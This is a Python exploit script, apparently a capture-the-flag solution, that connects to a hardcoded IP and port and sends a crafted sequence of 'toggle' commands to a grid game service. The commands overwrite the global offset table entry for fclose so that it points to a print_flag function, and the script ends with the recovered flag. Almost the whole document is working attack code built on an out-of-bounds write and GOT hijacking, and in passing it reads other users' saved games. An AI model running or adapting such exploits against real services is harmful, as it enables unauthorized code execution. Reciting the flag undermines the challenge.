# Many thanks to http://open-security.org/texts/6 for introducing the idea of hijacking the global offset table

import socket
import struct

HOST = "104.236.80.67"
PORT = 5686

def pack(p):
    return struct.pack('<I', p)

grid_loc = 0x804b080
got_loc = 0x804b00c # fclose
offset = got_loc - grid_loc 
print_flag_loc = pack(0x8048634)

payload = []
payload.append("print")
payload.append("load") # This is for shits and giggles to see the games that other people have saved
payload.append("print") # Let's print the games of other people!
toggle = "toggle "
for i in range(0, 4):
    toggle += chr(offset/8 + 48) + str(i + offset%8) + print_flag_loc[i] # We toggle the values of fclose to point to print_flag
payload.append(toggle)
payload.append("load") # Let's run load since it contains the call to fclose, which should call print_flag instead
print payload

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))
    sock.settimeout(0.1)
    print sock.recv(1024)
    for command in payload:
        sock.sendall(command + "\n")
        received = ""
        try:
            while True:
                received += sock.recv(1024)
        except Exception, e:
            print received
    sock.close()

main()

# Flag: connecting_colors_can_be_fun
